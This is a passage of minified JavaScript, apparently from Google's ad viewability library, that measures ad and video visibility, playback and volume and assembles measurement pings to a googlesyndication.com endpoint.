        var a = O();
        a.g = Cm(!0, this.ka, a.C)
    };
    Vm.prototype.T = function() {
        Qm(O(), this.ka)
    };
    Vm.prototype.Y = function() {
        return this.l.g
    };
    var Zm = function(a) {
        a = a.g;
        a.T();
        a.R();
        var b = O();
        b.I = Cm(!1, a.ka, b.C);
        Rm(O(), a.ka);
        a.l.g = a.Y()
    };
    Vm.prototype.sample = function() {};
    var $m = function(a, b) {
        a.g != a ? $m(a.g, b) : a.o !== b && (a.o = b, Wm(a))
    };
    Vm.prototype.Gc = function() {
        return this.g.o
    };
    var an = function(a) {
            a.L = a.B.length ? sb(a.B, function(b) {
                return b.Ca()
            }) : !1
        },
        bn = function(a) {
            var b = Bb(a.B);
            z(b, function(c) {
                c.Pa(a.l)
            })
        },
        Wm = function(a) {
            var b = Bb(a.B);
            z(b, function(c) {
                c.rb(a.g)
            });
            a.g != a || bn(a)
        };
    l = Vm.prototype;
    l.rb = function(a) {
        var b = this.g;
        this.g = a.Ga() >= this.I ? a : this;
        b !== this.g ? (this.o = this.g.o, Wm(this)) : this.o !== this.g.o && (this.o = this.g.o, Wm(this))
    };
    l.Pa = function(a) {
        if (a.h === this.g) {
            var b = this.l,
                c = this.L;
            if (c = a && (void 0 === c || !c || b.volume == a.volume) && b.l == a.l) b = b.g, c = a.g, c = b == c ? !0 : b && c ? b.top == c.top && b.right == c.right && b.bottom == c.bottom && b.left == c.left : !1;
            this.l = a;
            !c && bn(this)
        }
    };
    l.Ca = function() {
        return this.L
    };
    l.W = function() {
        this.M = !0
    };
    l.Ra = function() {
        return this.M
    };
    var cn = function(a, b, c, d) {
        this.l = a;
        this.g = new F(0, 0, 0, 0);
        this.A = new F(0, 0, 0, 0);
        this.h = b;
        this.U = c;
        this.H = d;
        this.G = !1;
        this.timestamp = -1;
        this.I = new sm(b.l, this.g, new F(0, 0, 0, 0), 0, 0, pm(), 0)
    };
    l = cn.prototype;
    l.rc = function() {
        return !0
    };
    l.Kb = function() {};
    l.W = function() {
        if (!this.Ra()) {
            var a = this.h;
            xb(a.B, this);
            a.L && this.Ca() && an(a);
            this.Kb();
            this.G = !0
        }
    };
    l.Ra = function() {
        return this.G
    };
    l.Ma = function() {
        return this.h.Ma()
    };
    l.Ga = function() {
        return this.h.Ga()
    };
    l.qb = function() {
        return this.h.qb()
    };
    l.Db = function() {
        return this.h.Db()
    };
    l.rb = function() {};
    l.Pa = function() {
        this.La()
    };
    l.Ca = function() {
        return this.H
    };
    var dn = function(a) {
        this.B = !1;
        this.g = a;
        this.o = La
    };
    l = dn.prototype;
    l.Ga = function() {
        return this.g.Ga()
    };
    l.qb = function() {
        return this.g.qb()
    };
    l.Db = function() {
        return this.g.Db()
    };
    l.create = function(a, b, c) {
        var d = null;
        this.g && (d = this.Lb(a, b, c), Ym(this.g, d));
        return d
    };
    l.ed = function() {
        return this.zb()
    };
    l.zb = function() {
        return !1
    };
    l.init = function(a) {
        return this.g.initialize() ? (Ym(this.g, this), this.o = a, !0) : !1
    };
    l.rb = function(a) {
        0 == a.Ga() && this.o(a.qb(), this)
    };
    l.Pa = function() {};
    l.Ca = function() {
        return !1
    };
    l.W = function() {
        this.B = !0
    };
    l.Ra = function() {
        return this.B
    };
    l.Ma = function() {
        return {}
    };
    var en = function(a, b, c) {
            this.l = void 0 === c ? 0 : c;
            this.h = a;
            this.g = null == b ? "" : b
        },
        fn = function(a) {
            switch (Math.trunc(a.l)) {
                case -16:
                    return -16;
                case -8:
                    return -8;
                case 0:
                    return 0;
                case 8:
                    return 8;
                case 16:
                    return 16;
                default:
                    return 16
            }
        },
        gn = function(a, b) {
            return a.l < b.l ? !0 : a.l > b.l ? !1 : a.h < b.h ? !0 : a.h > b.h ? !1 : typeof a.g < typeof b.g ? !0 : typeof a.g > typeof b.g ? !1 : a.g < b.g
        };
    var hn = function() {
        this.l = 0;
        this.g = [];
        this.h = !1
    };
    hn.prototype.add = function(a, b, c) {
        ++this.l;
        a = new en(a, b, c);
        this.g.push(new en(a.h, a.g, a.l + this.l / 4096));
        this.h = !0;
        return this
    };
    var jn = function(a, b) {
            z(b.g, function(c) {
                a.add(c.h, c.g, fn(c))
            })
        },
        kn = function(a, b) {
            var c = void 0 === c ? 0 : c;
            var d = void 0 === d ? !0 : d;
            Of(b, function(e, f) {
                d && void 0 === e || a.add(f, e, c)
            });
            return a
        },
        mn = function(a) {
            var b = ln;
            a.h && (Db(a.g, function(c, d) {
                return gn(d, c) ? 1 : gn(c, d) ? -1 : 0
            }), a.h = !1);
            return rb(a.g, function(c, d) {
                d = b(d);
                return "" + c + ("" != c && "" != d ? "&" : "") + d
            }, "")
        };
    var ln = function(a) {
        var b = a.h;
        a = a.g;
        return "" === a ? b : "boolean" === typeof a ? a ? b : "" : Array.isArray(a) ? 0 === a.length ? b : b + "=" + a.join() : b + "=" + (wb(["mtos", "tos", "p"], b) ? a : encodeURIComponent(a))
    };
    var nn = function(a) {
        var b = void 0 === b ? !0 : b;
        this.g = new hn;
        void 0 !== a && jn(this.g, a);
        b && this.g.add("v", Ek, -16)
    };
    nn.prototype.toString = function() {
        var a = "//pagead2.googlesyndication.com//pagead/gen_204",
            b = mn(this.g);
        0 < b.length && (a += "?" + b);
        return a
    };
    var on = function(a) {
            var b = [],
                c = [];
            Gb(a, function(d, e) {
                if (!(e in Object.prototype) && "undefined" != typeof d) switch (Array.isArray(d) && (d = d.join(",")), d = [e, "=", d].join(""), e) {
                    case "adk":
                    case "r":
                    case "tt":
                    case "error":
                    case "mtos":
                    case "tos":
                    case "p":
                    case "bs":
                        b.unshift(d);
                        break;
                    case "req":
                    case "url":
                    case "referrer":
                    case "iframe_loc":
                        c.push(d);
                        break;
                    default:
                        b.push(d)
                }
            });
            return b.concat(c)
        },
        pn = function() {
            if (Ek && "unreleased" !== Ek) return Ek
        },
        qn = function(a) {
            var b = void 0 === b ? 4E3 : b;
            a = a.toString();
            if (!/&v=[^&]+/.test(a)) {
                var c =
                    pn();
                a = c ? a + "&v=" + encodeURIComponent(c) : a
            }
            a = a.substring(0, b);
            Nl(a)
        };
    var rn = function() {
        this.g = 0
    };
    var sn = function(a, b, c) {
        z(a.l, function(d) {
            var e = a.g;
            if (!d.g && (d.l(b, c), d.o())) {
                d.g = !0;
                var f = d.h(),
                    g = new hn;
                g.add("id", "av-js");
                g.add("type", "verif");
                g.add("vtype", d.B);
                d = G(rn);
                g.add("i", d.g++);
                g.add("adk", e);
                kn(g, f);
                e = new nn(g);
                qn(e)
            }
        })
    };
    var tn = function() {
            this.h = this.l = this.o = this.g = 0
        },
        un = function(a, b, c, d) {
            b && (a.g += c, a.h += c, a.o += c, a.l = Math.max(a.l, a.o));
            if (void 0 === d ? !b : d) a.o = 0
        };
    var vn = [1, .75, .5, .3, 0],
        wn = function(a) {
            this.h = a = void 0 === a ? vn : a;
            this.g = qb(this.h, function() {
                return new tn
            })
        },
        yn = function(a, b) {
            return xn(a, function(c) {
                return c.g
            }, void 0 === b ? !0 : b)
        },
        An = function(a, b) {
            return zn(a, b, function(c) {
                return c.g
            })
        },
        Bn = function(a, b) {
            return xn(a, function(c) {
                return c.l
            }, void 0 === b ? !0 : b)
        },
        Cn = function(a, b) {
            return zn(a, b, function(c) {
                return c.l
            })
        },
        Dn = function(a, b) {
            return zn(a, b, function(c) {
                return c.h
            })
        },
        En = function(a) {
            z(a.g, function(b) {
                b.h = 0
            })
        },
        Fn = function(a, b, c, d, e, f, g) {
            g = void 0 ===
                g ? !0 : g;
            c = f ? Math.min(b, c) : c;
            for (f = 0; f < a.h.length; f++) {
                var h = a.h[f],
                    k = 0 < c && c >= h;
                h = !(0 < b && b >= h) || d;
                un(a.g[f], g && k, e, !g || h)
            }
        },
        xn = function(a, b, c) {
            a = qb(a.g, function(d) {
                return b(d)
            });
            return c ? a : Gn(a)
        },
        zn = function(a, b, c) {
            var d = vb(a.h, function(e) {
                return b <= e
            });
            return -1 == d ? 0 : c(a.g[d])
        },
        Gn = function(a) {
            return qb(a, function(b, c, d) {
                return 0 < c ? d[c] - d[c - 1] : d[c]
            })
        };
    var Hn = function() {
            this.h = new wn;
            this.V = new tn;
            this.H = this.C = -1;
            this.$ = 1E3;
            this.aa = new wn([1, .9, .8, .7, .6, .5, .4, .3, .2, .1, 0]);
            this.M = this.J = -1
        },
        In = function(a, b) {
            return Bn(a.h, void 0 === b ? !0 : b)
        };
    Hn.prototype.L = function(a, b, c, d) {
        this.C = -1 != this.C ? Math.min(this.C, b.Z) : b.Z;
        this.H = Math.max(this.H, b.Z);
        this.J = -1 != this.J ? Math.min(this.J, b.oa) : b.oa;
        this.M = Math.max(this.M, b.oa);
        Fn(this.aa, b.oa, c.oa, b.g, a, d);
        Fn(this.h, b.Z, c.Z, b.g, a, d);
        c = d || c.Za != b.Za ? c.isVisible() && b.isVisible() : c.isVisible();
        b = !b.isVisible() || b.g;
        un(this.V, c, a, b)
    };
    Hn.prototype.ab = function() {
        return this.V.l >= this.$
    };
    var Jn = new F(0, 0, 0, 0);

    function Kn(a, b) {
        b = Ln(b);
        return 0 === b ? 0 : Ln(a) / b
    }

    function Ln(a) {
        return Math.max(a.bottom - a.top, 0) * Math.max(a.right - a.left, 0)
    }

    function Mn(a, b) {
        if (!a || !b) return !1;
        for (var c = 0; null !== a && 100 > c++;) {
            if (a === b) return !0;
            try {
                if (a = zf(a) || a) {
                    var d = nf(a),
                        e = d && E(d),
                        f = e && e.frameElement;
                    f && (a = f)
                }
            } catch (g) {
                break
            }
        }
        return !1
    }

    function Nn(a, b, c) {
        if (!a || !b) return !1;
        b = Yf(Xf(a), -b.left, -b.top);
        a = (b.left + b.right) / 2;
        b = (b.top + b.bottom) / 2;
        var d = tg();
        Kf(d.top) && d.top && d.top.document && (d = d.top);
        if (!zm(d)) return !1;
        a = d.document.elementFromPoint(a, b);
        if (!a) return !1;
        b = (b = (b = nf(c)) && b.defaultView && b.defaultView.frameElement) && Mn(b, a);
        d = a === c;
        a = !d && a && Cf(a, function(e) {
            return e === c
        });
        return !(b || d || a)
    }

    function On(a, b, c, d) {
        return O().l ? !1 : 0 >= a.getWidth() || 0 >= a.getHeight() ? !0 : c && d ? gm(208, function() {
            return Nn(a, b, c)
        }) : !1
    };
    var Pn = new F(0, 0, 0, 0),
        Qn = function(a, b, c) {
            L.call(this);
            this.position = Xf(Pn);
            this.bc = this.Vb();
            this.Ic = -2;
            this.rf = Date.now();
            this.Od = -1;
            this.Yb = b;
            this.Xb = null;
            this.Ub = !1;
            this.hc = null;
            this.opacity = -1;
            this.kf = c;
            this.Pd = this.Jc = La;
            this.pa = new Bl;
            this.pa.Sa = a;
            this.pa.g = a;
            this.$a = !1;
            this.Wa = {
                Lc: null,
                Kc: null
            };
            this.Md = !0;
            this.Jb = null;
            this.sb = this.Ue = !1;
            N().C++;
            this.na = this.Bc();
            this.Nd = -1;
            this.ba = null;
            this.Pe = !1;
            a = this.U = new sl;
            tl(a, "od", el);
            nl(tl(a, "opac", hl));
            nl(tl(a, "sbeos", hl));
            nl(tl(a, "prf", hl));
            nl(tl(a,
                "mwt", hl));
            tl(a, "iogeo", hl);
            (a = this.pa.Sa) && a.getAttribute && !/-[a-z]/.test("googleAvInapp") && (Al && a.dataset ? "googleAvInapp" in a.dataset : a.hasAttribute ? a.hasAttribute("data-" + cd()) : a.getAttribute("data-" + cd())) && (O().h = !0);
            1 == this.kf ? vl(this.U, "od", 1) : vl(this.U, "od", 0)
        };
    t(Qn, L);
    l = Qn.prototype;
    l.N = function() {
        this.pa.g && (this.Wa.Lc && (gf(this.pa.g, "mouseover", this.Wa.Lc), this.Wa.Lc = null), this.Wa.Kc && (gf(this.pa.g, "mouseout", this.Wa.Kc), this.Wa.Kc = null));
        this.Jb && this.Jb.W();
        this.ba && this.ba.W();
        delete this.bc;
        delete this.Jc;
        delete this.Pd;
        delete this.pa.Sa;
        delete this.pa.g;
        delete this.Wa;
        delete this.Jb;
        delete this.ba;
        delete this.U;
        L.prototype.N.call(this)
    };
    l.Ya = function() {
        return this.ba ? this.ba.g : this.position
    };
    l.Oc = function(a) {
        N().Oc(a)
    };
    l.Ca = function() {
        return !1
    };
    l.Vb = function() {
        return new Hn
    };
    l.ra = function() {
        return this.bc
    };
    var Rn = function(a, b) {
            b != a.sb && (a.sb = b, a = O(), b ? a.A++ : 0 < a.A && a.A--)
        },
        Sn = function(a, b) {
            if (a.ba) {
                if (b.getName() === a.ba.getName()) return;
                a.ba.W();
                a.ba = null
            }
            b = b.create(a.pa.g, a.U, a.Ca());
            if (b = null != b && b.rc() ? b : null) a.ba = b
        },
        Tn = function(a, b, c) {
            if (!a.Xb || -1 == a.Yb || -1 === b.getTimestamp() || -1 === a.Xb.getTimestamp()) return 0;
            a = b.getTimestamp() - a.Xb.getTimestamp();
            return a > c ? 0 : a
        };
    Qn.prototype.zd = function(a) {
        return Tn(this, a, 1E4)
    };
    var Un = function(a, b, c) {
            if (a.ba) {
                a.ba.La();
                var d = a.ba.I,
                    e = d.l,
                    f = e.g;
                if (null != d.B) {
                    var g = d.h;
                    a.hc = new kf(g.left - f.left, g.top - f.top)
                }
                f = a.lc() ? Math.max(d.g, d.o) : d.g;
                g = {};
                null !== e.volume && (g.volume = e.volume);
                e = a.zd(d);
                a.Xb = d;
                a.Xc(f, b, c, !1, g, e, d.A)
            }
        },
        Vn = function(a) {
            if (a.Ub && a.Jb) {
                var b = 1 == wl(a.U, "od"),
                    c = O().g,
                    d = a.Jb,
                    e = a.ba ? a.ba.getName() : "ns",
                    f = new lf(c.getWidth(), c.getHeight());
                c = a.lc();
                a = {
                    nf: e,
                    hc: a.hc,
                    wf: f,
                    lc: c,
                    Z: a.na.Z,
                    sf: b
                };
                if (b = d.h) {
                    b.La();
                    e = b.I;
                    f = e.l.g;
                    var g = null,
                        h = null;
                    null != e.B && f && (g = e.h, g = new kf(g.left -
                        f.left, g.top - f.top), h = new lf(f.right - f.left, f.bottom - f.top));
                    e = c ? Math.max(e.g, e.o) : e.g;
                    c = {
                        nf: b.getName(),
                        hc: g,
                        wf: h,
                        lc: c,
                        sf: !1,
                        Z: e
                    }
                } else c = null;
                c && sn(d, a, c)
            }
        };
    l = Qn.prototype;
    l.Xc = function(a, b, c, d, e, f, g) {
        this.$a || (this.Ub && (a = this.uc(a, c, e, g), d = d && this.na.Z >= (this.Za() ? .3 : .5), this.Yc(f, a, d), this.Yb = b, 0 < a.Z && -1 === this.Nd && (this.Nd = b), -1 == this.Od && this.ab() && (this.Od = b), -2 == this.Ic && (this.Ic = Ln(this.Ya()) ? a.Z : -1), this.na = a), this.Jc(this))
    };
    l.Yc = function(a, b, c) {
        this.ra().L(a, b, this.na, c)
    };
    l.Bc = function() {
        return new gl
    };
    l.uc = function(a, b, c, d) {
        c = this.Bc();
        c.g = b;
        b = Ll().h;
        b = 0 === ih(Qe) ? -1 : b.isVisible() ? 0 : 1;
        c.h = b;
        c.Z = this.xc(a);
        c.Za = this.Za();
        c.oa = d;
        return c
    };
    l.xc = function(a) {
        return 0 === this.opacity && 1 === wl(this.U, "opac") ? 0 : a
    };
    l.Za = function() {
        return !1
    };
    l.lc = function() {
        return this.Pe || this.Ue
    };
    l.va = function() {
        return 0
    };
    l.ab = function() {
        return this.bc.ab()
    };
    var Wn = function(a, b, c) {
        b && (a.Jc = b);
        c && (a.Pd = c)
    };
    var Xn = "StopIteration" in u ? u.StopIteration : {
            message: "StopIteration",
            stack: ""
        },
        Yn = function() {};
    Yn.prototype.next = function() {
        return Yn.prototype.g.call(this)
    };
    Yn.prototype.g = function() {
        throw Xn;
    };
    Yn.prototype.lb = function() {
        return this
    };
    var Zn = function() {
            this.o = this.g = this.l = this.h = this.B = 0
        },
        $n = function(a) {
            var b = {};
            b = (b.ptlt = Ya() - a.B, b);
            var c = a.h;
            c && (b.pnk = c);
            (c = a.l) && (b.pnc = c);
            (c = a.o) && (b.pnmm = c);
            (a = a.g) && (b.pns = a);
            return b
        };
    var ao = function() {
        gl.call(this);
        this.l = !1;
        this.volume = void 0;
        this.paused = !1;
        this.mediaTime = -1
    };
    t(ao, gl);
    var bo = function(a) {
        return Km(a.volume) && 0 < a.volume
    };
    var co = function() {
            var a = {};
            this.h = (a.vs = [1, 0], a.vw = [0, 1], a.am = [2, 2], a.a = [4, 4], a.f = [8, 8], a.bm = [16, 16], a.b = [32, 32], a.avw = [0, 64], a.avs = [64, 0], a.pv = [256, 256], a.gdr = [0, 512], a.p = [0, 1024], a.r = [0, 2048], a.m = [0, 4096], a.um = [0, 8192], a.ef = [0, 16384], a.s = [0, 32768], a.pmx = [0, 16777216], a);
            this.g = {};
            for (var b in this.h) 0 < this.h[b][1] && (this.g[b] = 0);
            this.l = 0
        },
        eo = function(a, b) {
            var c = a.h[b],
                d = c[1];
            a.l += c[0];
            0 < d && 0 == a.g[b] && (a.g[b] = 1)
        },
        fo = function(a) {
            var b = Nb(a.h),
                c = 0,
                d;
            for (d in a.g) wb(b, d) && 1 == a.g[d] && (c += a.h[d][1], a.g[d] =
                2);
            return c
        },
        go = function(a) {
            var b = 0,
                c;
            for (c in a.g) {
                var d = a.g[c];
                if (1 == d || 2 == d) b += a.h[c][1]
            }
            return b
        };
    var ho = function() {
            this.h = this.g = 0
        },
        io = function(a, b, c) {
            32 <= b || (a.h & 1 << b && !c ? a.g &= ~(1 << b) : a.h & 1 << b || !c || (a.g |= 1 << b), a.h |= 1 << b)
        };
    var jo = function() {
        Hn.call(this);
        this.l = new tn;
        this.T = this.D = this.K = 0;
        this.I = -1;
        this.da = new tn;
        this.B = new tn;
        this.g = new wn;
        this.A = this.o = -1;
        this.G = new tn;
        this.$ = 2E3;
        this.R = new ho;
        this.Y = new ho;
        this.X = new ho
    };
    t(jo, Hn);
    var ko = function(a, b, c) {
        var d = a.T;
        om || c || -1 == a.I || (d += b - a.I);
        return d
    };
    jo.prototype.L = function(a, b, c, d) {
        if (!b.paused) {
            Hn.prototype.L.call(this, a, b, c, d);
            var e = bo(b) && bo(c),
                f = .5 <= (d ? Math.min(b.Z, c.Z) : c.Z);
            Km(b.volume) && (this.o = -1 != this.o ? Math.min(this.o, b.volume) : b.volume, this.A = Math.max(this.A, b.volume));
            f && (this.K += a, this.D += e ? a : 0);
            Fn(this.g, b.Z, c.Z, b.g, a, d, e);
            un(this.l, !0, a);
            un(this.B, e, a);
            un(this.G, c.l, a);
            un(this.da, e && !f, a);
            a = Math.floor(b.mediaTime / 1E3);
            io(this.R, a, b.isVisible());
            io(this.Y, a, 1 <= b.Z);
            io(this.X, a, bo(b))
        }
    };
    var lo = function() {
        this.g = !1
    };
    var mo = function(a, b) {
        this.g = !1;
        this.h = a;
        this.I = b;
        this.l = 0
    };
    t(mo, lo);
    var no = function(a, b) {
        return a.o(b) ? (b = a.I.report(a.h, b), a.l |= b, 0 == b) : !1
    };
    mo.prototype.o = function() {
        return !0
    };
    mo.prototype.B = function() {
        return !1
    };
    mo.prototype.getId = function() {
        var a = this,
            b = Rb(function(c) {
                return c == a.h
            });
        return xm[b].toString()
    };
    mo.prototype.toString = function() {
        var a = "";
        this.B() && (a += "c");
        this.g && (a += "s");
        0 < this.l && (a += ":" + this.l);
        return this.getId() + a
    };
    var oo = function(a, b, c, d) {
        cn.call(this, a, b, c, d)
    };
    t(oo, cn);
    l = oo.prototype;
    l.vc = function() {
        if (this.l) {
            var a = this.l,
                b = this.h.g.ka;
            try {
                try {
                    var c = Im(a.getBoundingClientRect())
                } catch (n) {
                    c = new F(0, 0, 0, 0)
                }
                var d = c.right - c.left,
                    e = c.bottom - c.top,
                    f = ng(a, b),
                    g = f.x,
                    h = f.y;
                var k = new F(Math.round(h), Math.round(g + d), Math.round(h + e), Math.round(g))
            } catch (n) {
                k = Xf(Jn)
            }
            this.g = k
        }
    };
    l.od = function() {
        this.A = this.h.l.g
    };
    l.Cd = function(a) {
        return On(a, this.A, this.l, 1 == wl(this.U, "od"))
    };
    l.pd = function() {
        this.timestamp = pm()
    };
    l.La = function() {
        this.pd();
        this.vc();
        if (this.l && "number" === typeof this.l.videoWidth && "number" === typeof this.l.videoHeight) {
            var a = this.l;
            var b = new lf(a.videoWidth, a.videoHeight);
            a = this.g;
            var c = a.getWidth(),
                d = a.getHeight(),
                e = b.width;
            b = b.height;
            0 >= e || 0 >= b || 0 >= c || 0 >= d || (e /= b, a = Xf(a), e > c / d ? (c /= e, d = (d - c) / 2, 0 < d && (d = a.top + d, a.top = Math.round(d), a.bottom = Math.round(d + c))) : (d *= e, c = Math.round((c - d) / 2), 0 < c && (c = a.left + c, a.left = Math.round(c), a.right = Math.round(c + d))));
            this.g = a
        }
        this.od();
        a = this.g;
        c = this.A;
        a = a.left <=
            c.right && c.left <= a.right && a.top <= c.bottom && c.top <= a.bottom ? new F(Math.max(a.top, c.top), Math.min(a.right, c.right), Math.min(a.bottom, c.bottom), Math.max(a.left, c.left)) : new F(0, 0, 0, 0);
        c = a.top >= a.bottom || a.left >= a.right ? new F(0, 0, 0, 0) : a;
        a = this.h.l;
        b = e = d = 0;
        0 < (this.g.bottom - this.g.top) * (this.g.right - this.g.left) && (this.Cd(c) ? c = new F(0, 0, 0, 0) : (d = O().B, b = new F(0, d.height, d.width, 0), d = Kn(c, this.g), e = Kn(c, O().g), b = Kn(c, b)));
        c = c.top >= c.bottom || c.left >= c.right ? new F(0, 0, 0, 0) : Yf(c, -this.g.left, -this.g.top);
        Sm() ||
            (e = d = 0);
        this.I = new sm(a, this.g, c, d, e, this.timestamp, b)
    };
    l.getName = function() {
        return this.h.getName()
    };
    var po = new F(0, 0, 0, 0),
        qo = function(a, b, c) {
            cn.call(this, null, a, b, c);
            this.C = a.Gc();
            this.B = 0
        };
    t(qo, oo);
    l = qo.prototype;
    l.rc = function() {
        this.o();
        return !0
    };
    l.Pa = function() {
        oo.prototype.La.call(this)
    };
    l.pd = function() {};
    l.vc = function() {};
    l.La = function() {
        this.o();
        oo.prototype.La.call(this)
    };
    l.rb = function(a) {
        a = a.Gc();
        a !== this.C && (a ? this.o() : (O().g = new F(0, 0, 0, 0), this.g = new F(0, 0, 0, 0), this.A = new F(0, 0, 0, 0), this.timestamp = -1));
        this.C = a
    };

    function ro(a) {
        return [a.top, a.left, a.bottom, a.right]
    }
    var so = {},
        to = (so.firstquartile = 0, so.midpoint = 1, so.thirdquartile = 2, so.complete = 3, so),
        uo = function(a, b, c, d, e, f) {
            e = void 0 === e ? null : e;
            f = void 0 === f ? [] : f;
            Qn.call(this, b, c, d);
            this.yc = 0;
            this.ga = {};
            this.fa = new co;
            this.Qd = {};
            this.ia = "";
            this.Ta = null;
            this.sa = !1;
            this.g = [];
            this.bb = e;
            this.A = f;
            this.B = null;
            this.l = -1;
            this.V = this.G = void 0;
            this.J = this.H = 0;
            this.R = -1;
            this.aa = this.$ = !1;
            this.M = this.C = this.h = this.wb = this.da = 0;
            new wn;
            this.T = this.X = 0;
            this.Y = -1;
            this.ea = 0;
            this.D = La;
            this.K = [this.Vb()];
            this.ua = 2;
            this.gb = {};
            this.gb.pause =
                "p";
            this.gb.resume = "r";
            this.gb.skip = "s";
            this.gb.mute = "m";
            this.gb.unmute = "um";
            this.gb.exitfullscreen = "ef";
            this.o = null
        };
    t(uo, Qn);
    uo.prototype.Ca = function() {
        return !0
    };
    var vo = function(a) {
        return void 0 === a ? a : Number(a) ? Dm(a, 3) : 0
    };
    l = uo.prototype;
    l.zd = function(a) {
        return Tn(this, a, Math.max(1E4, this.l / 3))
    };
    l.Xc = function(a, b, c, d, e, f, g) {
        var h = this,
            k = this.D(this) || {};
        Xb(k, e);
        this.l = k.duration || this.l;
        this.G = k.isVpaid || this.G;
        this.V = k.isYouTube || this.V;
        e = wo(this, b);
        1 === xo(this) && (f = e);
        Qn.prototype.Xc.call(this, a, b, c, d, k, f, g);
        this.bb && this.bb.g && z(this.A, function(n) {
            n.g || (n.g = no(n, h))
        })
    };
    l.Yc = function(a, b, c) {
        Qn.prototype.Yc.call(this, a, b, c);
        yo(this).L(a, b, this.na, c);
        this.aa = bo(this.na) && bo(b); - 1 == this.R && this.$ && (this.R = this.ra().l.g);
        this.fa.l = 0;
        a = this.ab();
        b.isVisible() && eo(this.fa, "vs");
        a && eo(this.fa, "vw");
        Km(b.volume) && eo(this.fa, "am");
        bo(b) && eo(this.fa, "a");
        this.sb && eo(this.fa, "f"); - 1 != b.h && (eo(this.fa, "bm"), 1 == b.h && eo(this.fa, "b"));
        bo(b) && b.isVisible() && eo(this.fa, "avs");
        this.aa && a && eo(this.fa, "avw");
        0 < b.Z && eo(this.fa, "pv");
        zo(this, this.ra().l.g, !0) && eo(this.fa, "gdr");
        2E3 <=
            Cn(this.ra().h, 1) && eo(this.fa, "pmx")
    };
    l.Vb = function() {
        return new jo
    };
    l.ra = function() {
        return this.bc
    };
    var yo = function(a, b) {
        return a.K[null != b && b < a.K.length ? b : a.K.length - 1]
    };
    uo.prototype.Bc = function() {
        return new ao
    };
    uo.prototype.uc = function(a, b, c, d) {
        a = Qn.prototype.uc.call(this, a, b, c, void 0 === d ? -1 : d);
        a.l = this.sb;
        a.paused = 2 == this.ea;
        a.volume = c.volume;
        Km(a.volume) || (this.da++, b = this.na, Km(b.volume) && (a.volume = b.volume));
        c = c.currentTime;
        a.mediaTime = void 0 !== c && 0 <= c ? c : -1;
        return a
    };
    var xo = function(a) {
            var b = !!wl(N().U, "umt");
            return a.G || !b && !a.V ? 0 : 1
        },
        wo = function(a, b) {
            2 == a.ea ? b = 0 : -1 == a.Yb ? b = 0 : (b -= a.Yb, b = b > Math.max(1E4, a.l / 3) ? 0 : b);
            var c = a.D(a) || {};
            c = void 0 !== c.currentTime ? c.currentTime : a.H;
            var d = c - a.H,
                e = 0;
            0 <= d ? (a.J += b, a.T += Math.max(b - d, 0), e = Math.min(d, a.J)) : a.X += Math.abs(d);
            0 != d && (a.J = 0); - 1 == a.Y && 0 < d && (a.Y = 0 <= nm ? pm() - nm : -1);
            a.H = c;
            return e
        };
    uo.prototype.xc = function(a) {
        return O().L ? 0 : this.sb ? 1 : Qn.prototype.xc.call(this, a)
    };
    uo.prototype.va = function() {
        return 1
    };
    uo.prototype.getDuration = function() {
        return this.l
    };
    var Ao = function(a, b) {
            sb(a.A, function(c) {
                return c.h == b.h
            }) || a.A.push(b)
        },
        zo = function(a, b, c) {
            return 15E3 <= b ? !0 : a.$ ? (void 0 === c ? 0 : c) ? !0 : 0 < a.l ? b >= a.l / 2 : 0 < a.R ? b >= a.R : !1 : !1
        },
        Bo = function(a) {
            var b = {},
                c = O();
            b.insideIframe = c.l;
            b.unmeasurable = a.$a;
            b.position = a.Ya();
            b.exposure = a.na.Z;
            b.documentSize = c.o;
            b.viewportSize = new lf(c.g.getWidth(), c.g.getHeight());
            null != a.o && (b.presenceData = a.o);
            b.screenShare = a.na.oa;
            return b
        },
        Co = function(a) {
            var b = Dm(a.na.Z, 2),
                c = a.fa.l,
                d = a.na,
                e = yo(a),
                f = vo(e.o),
                g = vo(e.A),
                h = vo(d.volume),
                k = Dm(e.C, 2),
                n = Dm(e.H, 2),
                m = Dm(d.Z, 2),
                v = Dm(e.J, 2),
                r = Dm(e.M, 2);
            d = Dm(d.oa, 2);
            a = Xf(a.Ya());
            a.round();
            e = In(e, !1);
            return {
                vf: b,
                Eb: c,
                cc: f,
                Zb: g,
                Ab: h,
                dc: k,
                $b: n,
                Z: m,
                ec: v,
                ac: r,
                oa: d,
                position: a,
                fc: e
            }
        },
        Eo = function(a, b) {
            Do(a.g, b, function() {
                return {
                    vf: 0,
                    Eb: void 0,
                    cc: -1,
                    Zb: -1,
                    Ab: -1,
                    dc: -1,
                    $b: -1,
                    Z: -1,
                    ec: -1,
                    ac: -1,
                    oa: -1,
                    position: void 0,
                    fc: []
                }
            });
            a.g[b] = Co(a)
        },
        Do = function(a, b, c) {
            for (var d = a.length; d < b + 1;) a.push(c()), d++
        },
        Ho = function(a, b, c) {
            var d = a.Qd[b];
            if (null != d) return d;
            d = Fo(a, b);
            var e = Rb(function(f) {
                return f == b
            });
            a = Go(a,
                d, d, c, to[Sb[e]]);
            "fully_viewable_audible_half_duration_impression" == b && (a.std = "csm");
            return a
        },
        Io = function(a, b, c) {
            var d = [b];
            if (a != b || c != b) d.unshift(a), d.push(c);
            return d
        },
        Go = function(a, b, c, d, e) {
            if (a.$a) return {
                "if": 0
            };
            var f = Xf(a.Ya());
            f.round();
            var g = O(),
                h = N(),
                k = a.ra(),
                n = a.ba ? a.ba.getName() : "ns",
                m = {};
            m["if"] = g.l ? 1 : void 0;
            m.sdk = a.B ? a.B : void 0;
            m.t = a.rf;
            m.p = [f.top, f.left, f.bottom, f.right];
            m.tos = yn(k.h, !1);
            m.mtos = In(k);
            m.mcvt = k.V.l;
            m.ps = void 0;
            m.vht = ko(k, pm(), 2 == a.ea);
            m.mut = k.da.l;
            m.a = vo(a.na.volume);
            m.mv = vo(k.A);
            m.fs = a.sb ? 1 : 0;
            m.ft = k.G.g;
            m.at = k.B.g;
            m.as = 0 < k.o ? 1 : 0;
            m.atos = yn(k.g);
            m.ssb = yn(k.aa, !1);
            m.amtos = Bn(k.g, !1);
            m.uac = a.da;
            m.vpt = k.l.g;
            "nio" == n && (m.nio = 1, m.avms = "nio");
            m.gmm = "4";
            m.gdr = zo(a, k.l.g, !0) ? 1 : 0;
            m.efpf = a.ua;
            if ("gsv" == n || "nis" == n) f = a.ba, 0 < f.B && (m.nnut = f.B);
            m.tcm = xo(a);
            m.nmt = a.X;
            m.bt = a.T;
            m.pst = a.Y;
            m.vpaid = a.G;
            m.dur = a.l;
            m.vmtime = a.H;
            m.is = a.fa.l;
